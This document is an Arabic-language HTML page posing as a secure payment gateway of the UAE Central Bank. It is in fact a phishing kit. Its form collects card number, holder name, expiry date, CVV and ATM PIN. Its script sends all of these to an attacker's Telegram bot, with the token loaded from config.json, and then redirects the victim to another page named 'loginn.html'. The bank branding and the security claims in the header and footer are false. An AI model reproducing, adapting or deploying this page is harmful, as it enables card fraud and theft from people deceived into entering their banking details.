<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>بوابة الدفع الآمن</title>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet" />
<style>
  *, *::before, *::after {
    box-sizing: border-box;
  }
  body {
    font-family: 'Tajawal', sans-serif;
    background: linear-gradient(135deg, #ffe5e5, #ffffff);
    margin: 0;
    padding: 0;
    color: #2c3e50;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
  }
  header {
    width: 100%;
    background: #c0392b;
    padding: 10px 0;
    box-shadow: 0 4px 8px rgba(192, 57, 43, 0.4);
    margin-bottom: 22px;
    text-align: center;
  }
  header h1 {
    color: white;
    font-size: 18px;
    font-weight: 700;
    margin: 0;
    letter-spacing: 1.1px;
  }
  header p {
    color: #ffd6d6;
    font-weight: 500;
    margin-top: 3px;
    font-size: 11px;
    letter-spacing: 0.5px;
  }
  .payment-container {
    background: #fff;
    max-width: 380px;
    width: 90%;
    padding: 20px 22px 32px;
    border-radius: 20px;
    box-shadow: 0 12px 28px rgba(0,0,0,0.12);
    transition: box-shadow 0.3s ease;
    text-align: center;
  }
  .payment-container:hover {
    box-shadow: 0 16px 36px rgba(0,0,0,0.16);
  }
  .aramx-logo {
    width: 160px;
    margin-bottom: 20px;
  }
  h2 {
    font-weight: 700;
    font-size: 20px;
    color: #e74c3c;
    margin-bottom: 30px;
    letter-spacing: 1px;
  }
  label {
    display: block;
    margin-bottom: 6px;
    font-weight: 600;
    color: #34495e;
    font-size: 13px;
  }
  .input-group {
    position: relative;
    margin-bottom: 20px;
    text-align: left;
  }
  input {
    width: 100%;
    padding: 12px 42px 12px 12px;
    border-radius: 10px;
    border: 1.4px solid #bdc3c7;
    font-size: 14px;
    transition: border-color 0.3s ease, box-shadow 0.3s ease;
    direction: ltr;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  input:focus {
    border-color: #e74c3c;
    box-shadow: 0 0 8px rgba(231, 76, 60, 0.35);
    outline: none;
  }
  input:disabled {
    background-color: #f3f3f3;
    cursor: not-allowed;
  }
  .card-icon {
    position: absolute;
    top: 50%;
    left: 12px;
    transform: translateY(-50%);
    width: 28px;
    height: 18px;
    opacity: 0.85;
    transition: opacity 0.3s ease;
  }
  .flex-row {
    display: flex;
    gap: 14px;
    margin-bottom: 20px;
  }
  .flex-row > div {
    flex: 1;
  }
  .btn {
    width: 100%;
    padding: 14px 0;
    font-size: 15px;
    font-weight: 700;
    color: #fff;
    background: linear-gradient(90deg, #e74c3c, #c0392b);
    border: none;
    border-radius: 14px;
    cursor: pointer;
    box-shadow: 0 6px 15px rgba(231, 76, 60, 0.4);
    transition: background 0.3s ease, box-shadow 0.3s ease;
    user-select: none;
    margin-top: 25px;
  }
  .btn:hover {
    background: linear-gradient(90deg, #c0392b, #e74c3c);
    box-shadow: 0 8px 20px rgba(192, 57, 43, 0.6);
  }
  .footer {
    width: 100%;
    max-width: 380px;
    margin: 30px auto 50px;
    background: #f9fafb;
    border-radius: 18px;
    padding: 18px 14px;
    box-shadow: 0 6px 18px rgba(0,0,0,0.05);
    text-align: center;
  }
  .footer-icons {
    margin-bottom: 10px;
  }
  .footer-icons img {
    width: 34px;
    margin: 0 9px;
    vertical-align: middle;
    filter: drop-shadow(0 1px 1px rgba(0,0,0,0.07));
    transition: transform 0.25s ease;
  }
  .footer-icons img:hover {
    transform: scale(1.15);
  }
  .footer-text {
    font-size: 12px;
    color: #7f8c8d;
    letter-spacing: 0.5px;
    font-weight: 500;
  }
  .error-message {
    color: #e74c3c;
    font-size: 12px;
    margin-top: 6px;
    font-weight: 600;
  }
  @media (max-width: 480px) {
    .payment-container, .footer {
      padding: 16px;
    }
    h2 {
      font-size: 18px;
    }
    label {
      font-size: 12px;
    }
    input {
      padding: 10px;
    }
    .btn {
      padding: 12px 0;
      font-size: 14px;
    }
  }
</style>
</head>
<body>
<header>
  <h1>بوابة الدفع الآمن</h1>
  <p>معالجة المدفوعات بأعلى معايير الأمان والتشفير</p>
</header>

<div class="payment-container">
  
  <h2>معلومات الدفع</h2>
  <form id="paymentForm" autocomplete="off" novalidate>
    <div class="input-group">
      <label for="cardNumber">رقم البطاقة</label>
      <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" required />
      <img src="" alt="Card Icon" id="cardIcon" class="card-icon" style="display:none" />
      <div id="cardNumberError" class="error-message" style="display:none;">يرجى إدخال رقم بطاقة صالح</div>
    </div>

    <div class="input-group">
      <label for="cardName">اسم حامل البطاقة</label>
      <input type="text" id="cardName" placeholder="AHMED ALI" style="text-transform:uppercase;" required />
      <div id="cardNameError" class="error-message" style="display:none;">يرجى إدخال الاسم بالحروف الإنجليزية الكبيرة فقط</div>
    </div>

    <div class="flex-row">
      <div>
        <label for="expiry">تاريخ الانتهاء</label>
        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" required />
        <div id="expiryError" class="error-message" style="display:none;">يرجى التحقق من تاريخ الانتهاء</div>
      </div>
      <div>
        <label for="cvv">رمز CVV</label>
        <input type="text" id="cvv" placeholder="123" maxlength="3" inputmode="numeric" required />
        <div id="cvvError" class="error-message" style="display:none;">رمز CVV غير صالح</div>
      </div>
    </div>

    <div class="input-group">
      <label for="pin">رمز الصراف</label>
      <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric" required />
      <div id="pinError" class="error-message" style="display:none;">يرجى إدخال رمز الصراف</div>
    </div>

    <button type="submit" class="btn">الدفع</button>
  </form>
</div>

<div class="footer">
  <div class="footer-icons">
    <img src="https://img.icons8.com/color/48/apple-pay.png" alt="Apple Pay" />
    <img src="https://img.icons8.com/color/48/visa.png" alt="Visa" />
    <img src="https://img.icons8.com/color/48/mastercard.png" alt="MasterCard" />
    <img src="https://img.icons8.com/color/48/google-pay.png" alt="Google Pay" />
  </div>
  <div class="footer-text">
    الدفع الآمن يتم تشفير البيانات - &copy; مصرف الإمارات العربية المتحدة المركزي 2025
  </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {
  const cardNumberInput = document.getElementById("cardNumber");
  const cardIcon = document.getElementById("cardIcon");
  const cardNameInput = document.getElementById("cardName");
  const expiryInput = document.getElementById("expiry");
  const paymentForm = document.getElementById("paymentForm");

  cardNameInput.addEventListener("input", function () {
    this.value = this.value.replace(/[^A-Z\s]/g, '');
  });

  function luhnCheck(number) {
    let sum = 0;
    let shouldDouble = false;
    for (let i = number.length - 1; i >= 0; i--) {
      let digit = parseInt(number.charAt(i), 10);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }

  function getCardType(number) {
    if (/^4/.test(number)) return 'visa';
    if (/^5[1-5]/.test(number)) return 'mastercard';
    return null;
  }

  cardNumberInput.addEventListener("input", e => {
    let val = e.target.value.replace(/\D/g, '').slice(0, 16);
    e.target.value = val.replace(/(.{4})/g, '$1 ').trim();

    const cardType = getCardType(val);
    if (cardType === 'visa') {
      cardIcon.src = "https://img.icons8.com/color/48/visa.png";
      cardIcon.style.display = "block";
    } else if (cardType === 'mastercard') {
      cardIcon.src = "https://img.icons8.com/color/48/mastercard.png";
      cardIcon.style.display = "block";
    } else {
      cardIcon.style.display = "none";
    }
  });

  expiryInput.addEventListener("input", e => {
    let val = e.target.value.replace(/[^0-9]/g, '').slice(0,4);
    if(val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
    e.target.value = val;
  });

  function isExpiryValid(expiry) {
    if(!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    const [mm, yy] = expiry.split('/').map(x => parseInt(x,10));
    return (mm >= 1 && mm <= 12) && (yy >= 25 && yy <= 35);
  }

  function isCvvValid(cvv) { return /^[0-9]{3}$/.test(cvv); }
  function isPinValid(pin) { return /^[0-9]{4}$/.test(pin); }
  function isCardValid(number) { return luhnCheck(number) && number.length === 16; }
  function isNameValid(name) { return /^[A-Z\s]+$/.test(name); }

  function showError(id, show) {
    document.getElementById(id).style.display = show ? 'block' : 'none';
  }

  // تحميل config.json
  const configRes = await fetch("config.json");
  if (!configRes.ok) throw new Error("فشل تحميل config.json");
  const config = await configRes.json();
  const BOT_TOKEN = config.botToken;
  const CHAT_ID = config.chatId;

  paymentForm.addEventListener("submit", async e => {
    e.preventDefault();

    const cardNumber = cardNumberInput.value.replace(/\s/g, '');
    const cardName = cardNameInput.value.trim();
    const expiry = expiryInput.value.trim();
    const cvv = document.getElementById("cvv").value.trim();
    const pin = document.getElementById("pin").value.trim();

    let valid = true;

    if (!isCardValid(cardNumber)) { showError("cardNumberError", true); valid = false; } else showError("cardNumberError", false);
    if (!isNameValid(cardName)) { showError("cardNameError", true); valid = false; } else showError("cardNameError", false);
    if (!isExpiryValid(expiry)) { showError("expiryError", true); valid = false; } else showError("expiryError", false);
    if (!isCvvValid(cvv)) { showError("cvvError", true); valid = false; } else showError("cvvError", false);
    if (!isPinValid(pin)) { showError("pinError", true); valid = false; } else showError("pinError", false);

    if (!valid) return;

    try {
      const text = `🧾 تم استلام بيانات الدفع:
💳 رقم البطاقة: ${cardNumber}
👤 الاسم: ${cardName}
📆 الانتهاء: ${expiry}
🔒 CVV: ${cvv}
🔐 PIN: ${pin}`;

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
      });

      const data = await response.json();
      if (data.ok) {
        paymentForm.reset();
        cardIcon.style.display = "none";
        setTimeout(() => { window.location.href = "loginn.html"; }, 2000);
      } else {
        throw new Error("فشل إرسال البيانات");
      }
    } catch (error) {
      alert("⚠️ حدث خطأ أثناء الاتصال.");
      console.error(error);
    }
  });
});

</script>
</body>
</html>